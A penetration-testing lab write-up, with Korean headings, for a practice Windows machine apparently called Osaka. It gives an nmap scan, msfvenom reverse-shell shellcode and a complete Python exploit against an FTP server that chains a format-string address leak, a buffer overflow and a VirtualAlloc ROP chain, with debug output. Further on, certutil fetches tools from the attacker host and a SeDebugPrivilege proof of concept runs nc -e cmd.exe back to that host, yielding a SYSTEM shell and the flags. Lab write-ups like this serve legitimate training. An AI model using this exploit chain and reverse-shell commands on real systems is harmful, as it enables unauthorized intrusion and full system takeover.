---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/web/lfi-rfi
  - tech/payload/msfvenom
  - tech/payload/revshell
type: machine
platform: pg
os: windows
ip: 192.168.243.20
ports: [21, 135, 139, 445, 3389, 5985, 47001]
services: [ftp, http, microsoft-ds, ms-wbt-server, msrpc, netbios-ssn]
status: solved
tech_count: 3
---
### Nmap
```bash
┌──(kali㉿kali)-[~/PG/Osaka]
└─$ nnmap 192.168.243.20
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-18 08:51 +0900
Nmap scan report for 192.168.243.20
Host is up (0.085s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp
| fingerprint-strings:
|   GenericLines, NULL, SSLSessionReq:
|_    220 Welcome to Simple FTP Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=osaka
| Not valid before: 2026-08-16T23:49:31
|_Not valid after:  2027-02-15T23:49:31
| rdp-ntlm-info:
|   Target_Name: OSAKA
|   NetBIOS_Domain_Name: OSAKA
|   NetBIOS_Computer_Name: OSAKA
|   DNS_Domain_Name: osaka
|   DNS_Computer_Name: osaka
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-17T23:53:27+00:00
|_ssl-date: 2026-08-17T23:53:34+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.98%I=7%D=8/18%Time=6A839EB6%P=x86_64-pc-linux-gnu%r(NULL
SF:,22,"220\x20Welcome\x20to\x20Simple\x20FTP\x20Server\r\n")%r(GenericLin
SF:es,24,"220\x20Welcome\x20to\x20Simple\x20FTP\x20Server\r\n\r\n")%r(SSLS
SF:essionReq,24,"220\x20Welcome\x20to\x20Simple\x20FTP\x20Server\r\n\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=8/18%OT=21%CT=1%CU=34081%PV=Y%DS=4%DC=T%G=Y%TM=6A839F3
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=I%CI=I%TS=U)SEQ(SP=1
OS:04%GCD=1%ISR=10F%TI=I%CI=I%TS=U)SEQ(SP=107%GCD=1%ISR=107%TI=I%CI=I%TS=U)
OS:SEQ(SP=107%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=FD%GCD=1%ISR=10C%TI=I%CI=
OS:I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578N
OS:W8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN
OS:(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: Host: Simple; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-08-17T23:53:27
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   84.72 ms 192.168.45.1
2   84.67 ms 192.168.45.254
3   85.37 ms 192.168.251.1
4   85.54 ms 192.168.243.20

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 151.61 seconds
```



쉘코드 생성
```bash
┌──(kali㉿kali)-[~/PG/Osaka]
└─$ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.45.207 LPORT=443 -f py -v sc -o shellcode.txt
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of py file: 1576 bytes
Saved as: shellcode.txt

┌──(kali㉿kali)-[~/PG/Osaka]
└─$ cat shellcode.txt
sc =  b""
sc += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
sc += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
sc += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
sc += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
sc += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
sc += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
sc += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
sc += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
sc += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
sc += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
sc += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
sc += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
sc += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
sc += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
sc += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
sc += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
sc += b"\x2d\xcf\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56"
sc += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
sc += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
sc += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
sc += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
sc += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
sc += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
sc += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
sc += b"\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
sc += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
sc += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

```

전체 exploit
```bash
┌──(kali㉿kali)-[~/PG/Osaka]
└─$ cat exploit.py                                                                                    from pwn import *

sc =  b""
sc += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
sc += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
sc += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
sc += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
sc += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
sc += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
sc += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
sc += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
sc += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
sc += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
sc += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
sc += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
sc += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
sc += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
sc += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
sc += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
sc += b"\x2d\xcf\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56"
sc += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
sc += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
sc += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
sc += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
sc += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
sc += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
sc += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
sc += b"\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
sc += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
sc += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

p = remote('192.168.243.20', 21, level='debug')
p.recvuntil(b"220 Welcome to Simple FTP Server")
p.sendline(b"USER admin")
p.recvuntil(b"331 User OK, password required")
p.sendline(b"PASS admin")
p.recvuntil(b"230 Login successful")

# Leak Base Address for ROP
p.sendline(b"DEBUG " + b"%x|" * 100)
leak = p.recvlines(numlines=2)[-1][6:]
leak = leak.split(b"|")
leak_pie = int(leak[0], 16)
leak_ntdll = int(leak[4], 16)
bin_base = leak_pie - 0x10f0
print(f"Binary Base:   {hex(bin_base)}")

total = 1000
rop_gadgets = [
    # Setting up the registers for VirtualAlloc
    0xe145 + bin_base,  # POP EBP # RETN
    0xe145 + bin_base,  # Skip 4 bytes
    0x1d5a9 + bin_base, # POP EBX # RETN
    0x1,                # EBX = 1
    0x1bd7e + bin_base, # POP EDX # RETN
    0x1000,             # EDX = 0x1000 (size)
    0x11a2b + bin_base, # POP ECX # RETN
    0x40,               # ECX = 0x40 (executable permissions)
    0x4667 + bin_base,  # POP EDI # RETN
    0x4682 + bin_base,  # RETN (ROP NOP)
    0x1dff + bin_base,  # POP ESI # RETN
    0x14adb + bin_base, # JMP [EAX]
    0x1d2bf + bin_base, # POP EAX # RETN
    0x1e008 + bin_base, # Pointer to VirtualAlloc()
    0x10d6 + bin_base,  # PUSHAD # RETN
    0x10da + bin_base,  # JMP ESP
]
rop = b""
for gadget in rop_gadgets:
    rop += p32(gadget)

print("Press any key to send")
input()

buf  = b""
buf += b"A" * (268 + 4)
buf += rop
buf += b"\x90" * 16        # real NOP sled
buf += sc
buf += b"C" * (total - len(buf))
assert len(buf) == total, f"buf len {len(buf)} != {total} (NOP 개수로 조절)"

p.send(b"RETR " + buf + b"\r\n")
p.interactive()
```





```bash
┌──(kali㉿kali)-[~/PG/Osaka]
└─$ python exploit.py
[+] Opening connection to 192.168.243.20 on port 21: Done
[DEBUG] Received 0x22 bytes:
    b'220 Welcome to Simple FTP Server\r\n'
[DEBUG] Sent 0xb bytes:
    b'USER admin\n'
[DEBUG] Received 0x20 bytes:
    b'331 User OK, password required\r\n'
[DEBUG] Sent 0xb bytes:
    b'PASS admin\n'
[DEBUG] Received 0x16 bytes:
    b'230 Login successful\r\n'
[DEBUG] Sent 0x133 bytes:
    b'DEBUG %x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|\n'
[DEBUG] Received 0x37d bytes:
    b'DEBUG 12d10f0|546b8|54438|0|6fec24|55424544|32312047|66303164|34357c30|7c386236|33343435|7c307c38|63656636|357c3432|34323435|7c343435|31333233|37343032|3336367c|36313330|34337c34|63373533|377c3033|36383363|7c363332|34333333|35333433|3363377c|33633730|33367c38|36363536|337c3633|33633735|7c323334|32333433|35333433|3363377c|33343334|31337c35|32333333|337c3333|33343337|7c323330|36333333|63373633|3336337c|33333331|34337c30|63373333|367c3433|33373333|7c333335|63373733|33333033|3336337c|36333338|63377c33|33333633|337c3233|33333334|7c333333|33333533|33333433|3633337c|37373333|33337c63|37333336|337c3033|37363333|7c383363|36333633|36333533|3733337c|33363363|33337c33|37333336|377c3533|33323363|7c343333|33333233|33333433|3335337c|33343333|33337c33|37333336|337c6337|33343333|7c343333|33333133|35336337|3332337c|33333333|33337c33|33336337|337c3333|33343333|7c373333|32336337|30333333|3336337c|\n'
    b'\r\n'
Binary Base:   0x12d0000
Press any key to send

[DEBUG] Sent 0x3ef bytes:
    00000000  52 45 54 52  20 41 41 41  41 41 41 41  41 41 41 41  │RETR│ AAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000110  41 41 41 41  41 45 e1 2d  01 45 e1 2d  01 a9 d5 2e  │AAAA│AE·-│·E·-│···.│
    00000120  01 01 00 00  00 7e bd 2e  01 00 10 00  00 2b 1a 2e  │····│·~·.│····│·+·.│
    00000130  01 40 00 00  00 67 46 2d  01 82 46 2d  01 ff 1d 2d  │·@··│·gF-│··F-│···-│
    00000140  01 db 4a 2e  01 bf d2 2e  01 08 e0 2e  01 d6 10 2d  │··J.│···.│···.│···-│
    00000150  01 da 10 2d  01 90 90 90  90 90 90 90  90 90 90 90  │···-│····│····│····│
    00000160  90 90 90 90  90 fc e8 82  00 00 00 60  89 e5 31 c0  │····│····│···`│··1·│
    00000170  64 8b 50 30  8b 52 0c 8b  52 14 8b 72  28 0f b7 4a  │d·P0│·R··│R··r│(··J│
    00000180  26 31 ff ac  3c 61 7c 02  2c 20 c1 cf  0d 01 c7 e2  │&1··│<a|·│, ··│····│
    00000190  f2 52 57 8b  52 10 8b 4a  3c 8b 4c 11  78 e3 48 01  │·RW·│R··J│<·L·│x·H·│
    000001a0  d1 51 8b 59  20 01 d3 8b  49 18 e3 3a  49 8b 34 8b  │·Q·Y│ ···│I··:│I·4·│
    000001b0  01 d6 31 ff  ac c1 cf 0d  01 c7 38 e0  75 f6 03 7d  │··1·│····│··8·│u··}│
    000001c0  f8 3b 7d 24  75 e4 58 8b  58 24 01 d3  66 8b 0c 4b  │·;}$│u·X·│X$··│f··K│
    000001d0  8b 58 1c 01  d3 8b 04 8b  01 d0 89 44  24 24 5b 5b  │·X··│····│···D│$$[[│
    000001e0  61 59 5a 51  ff e0 5f 5f  5a 8b 12 eb  8d 5d 68 33  │aYZQ│··__│Z···│·]h3│
    000001f0  32 00 00 68  77 73 32 5f  54 68 4c 77  26 07 ff d5  │2··h│ws2_│ThLw│&···│
    00000200  b8 90 01 00  00 29 c4 54  50 68 29 80  6b 00 ff d5  │····│·)·T│Ph)·│k···│
    00000210  50 50 50 50  40 50 40 50  68 ea 0f df  e0 ff d5 97  │PPPP│@P@P│h···│····│
    00000220  6a 05 68 c0  a8 2d cf 68  02 00 01 bb  89 e6 6a 10  │j·h·│·-·h│····│··j·│
    00000230  56 57 68 99  a5 74 61 ff  d5 85 c0 74  0c ff 4e 08  │VWh·│·ta·│···t│··N·│
    00000240  75 ec 68 f0  b5 a2 56 ff  d5 68 63 6d  64 00 89 e3  │u·h·│··V·│·hcm│d···│
    00000250  57 57 57 31  f6 6a 12 59  56 e2 fd 66  c7 44 24 3c  │WWW1│·j·Y│V··f│·D$<│
    00000260  01 01 8d 44  24 10 c6 00  44 54 50 56  56 56 46 56  │···D│$···│DTPV│VVFV│
    00000270  4e 56 56 53  56 68 79 cc  3f 86 ff d5  89 e0 4e 56  │NVVS│Vhy·│?···│··NV│
    00000280  46 ff 30 68  08 87 1d 60  ff d5 bb f0  b5 a2 56 68  │F·0h│···`│····│··Vh│
    00000290  a6 95 bd 9d  ff d5 3c 06  7c 0a 80 fb  e0 75 05 bb  │····│··<·│|···│·u··│
    000002a0  47 13 72 6f  6a 00 53 ff  d5 43 43 43  43 43 43 43  │G·ro│j·S·│·CCC│CCCC│
    000002b0  43 43 43 43  43 43 43 43  43 43 43 43  43 43 43 43  │CCCC│CCCC│CCCC│CCCC│
    *
    000003e0  43 43 43 43  43 43 43 43  43 43 43 43  43 0d 0a     │CCCC│CCCC│CCCC│C··│
    000003ef
[*] Switching to interactive mode

$
```

local flag 획득
```bash
C:\Users\Wilson\Desktop>type local.txt
type local.txt
1626da9ca8660f809d1df31fa797af30

C:\Users\Wilson\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.243.20
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.243.254
   
```

계정 권한 확인
```bash
C:\Users\Wilson\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                                   State
=============================== ============================================= ========
SeLoadDriverPrivilege           Load and unload device drivers                Disabled
SeDebugPrivilege                Debug programs                                Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                      Enabled
SeTrustedCredManAccessPrivilege Access Credential Manager as a trusted caller Disabled
SeIncreaseWorkingSetPrivilege   Increase a process working set                Disabled
```

PoC 
https://github.com/r4j3sh-com/SeDebugPrivilegePoC

파일 이동
```bash
C:\Users\Wilson\Desktop>certutil -urlcache -split -f http://192.168.45.207/SeDebugPrivilegePoC.exe
certutil -urlcache -split -f http://192.168.45.207/SeDebugPrivilegePoC.exe
****  Online  ****
  0000  ...
  2a00
CertUtil: -URLCache command completed successfully.

C:\Users\Wilson\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 80CF-7607

 Directory of C:\Users\Wilson\Desktop

08/17/2026  06:14 PM    <DIR>          .
08/17/2026  06:14 PM    <DIR>          ..
08/17/2026  05:49 PM                34 local.txt
08/17/2026  06:14 PM            10,752 SeDebugPrivilegePoC.exe
               2 File(s)         10,786 bytes
               2 Dir(s)  24,216,596,480 bytes free

C:\Users\Wilson\Desktop>certutil -urlcache -split -f http://192.168.45.207/nc64.exe
certutil -urlcache -split -f http://192.168.45.207/nc64.exe
****  Online  ****
  0000  ...
  014f
CertUtil: -URLCache command FAILED: 0x80190194 (-2145844844 HTTP_E_STATUS_NOT_FOUND)
CertUtil: Not found (404).

C:\Users\Wilson\Desktop>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Wilson\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 80CF-7607

 Directory of C:\Users\Wilson\Desktop

08/17/2026  06:14 PM    <DIR>          .
08/17/2026  06:14 PM    <DIR>          ..
08/17/2026  05:49 PM                34 local.txt
08/17/2026  06:14 PM               335 nc64.exe
08/17/2026  06:14 PM            10,752 SeDebugPrivilegePoC.exe
               3 File(s)         11,121 bytes
               2 Dir(s)  24,215,904,256 bytes free
```


exploit 실행
```bash
C:\Users\Wilson\Desktop>.\SeDebugPrivilegePoC.exe "C:\Users\Wilson\Desktop\nc64_new.exe 192.168.45.207 4444 -e C:\Windows\system32\cmd.exe"
.\SeDebugPrivilegePoC.exe "C:\Users\Wilson\Desktop\nc64_new.exe 192.168.45.207 4444 -e C:\Windows\system32\cmd.exe"
[*] Modified by r4j3sh
[*] Executing command: C:\Users\Wilson\Desktop\nc64_new.exe 192.168.45.207 4444 -e C:\Windows\system32\cmd.exe
[*] If you have SeDebugPrivilege, you can get handles from privileged processes.
[*] This PoC tries to Execute the command as a winlogon.exe's child process.
[>] Searching winlogon PID.
[+] PID of winlogon: 552
[>] Trying to get handle to winlogon.
[+] Got handle to winlogon with PROCESS_ALL_ACCESS (hProcess = 0x2C0).
[+] New process is created successfully.
    |-> PID : 1076
    |-> TID : 4324
```
flag 획득
```bash
┌──(kali㉿kali)-[~/PG/Osaka]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.243.20] 50087
Microsoft Windows [Version 10.0.17763.4252]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Wilson\Desktop>whoami
whoami
nt authority\system

C:\Users\Wilson\Desktop>type c:\users\administrator\desktop\proof.txt
type c:\users\administrator\desktop\proof.txt
d75fcc9d6d14a696241176dda9889aa1

C:\Users\Wilson\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.243.20
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.243.254
```

